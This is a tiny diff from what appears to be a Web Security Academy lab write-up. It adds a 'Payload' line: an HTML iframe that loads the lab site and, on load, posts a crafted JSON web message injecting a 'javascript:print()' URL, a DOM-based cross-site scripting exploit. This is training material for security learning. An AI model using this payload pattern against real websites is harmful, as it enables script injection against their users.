@@ -63,5 +63,5 @@
 ```
 * Payload
 ```html
-
+<iframe src="https://acbe1f971f2cee6bc0482be200600037.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
 ```
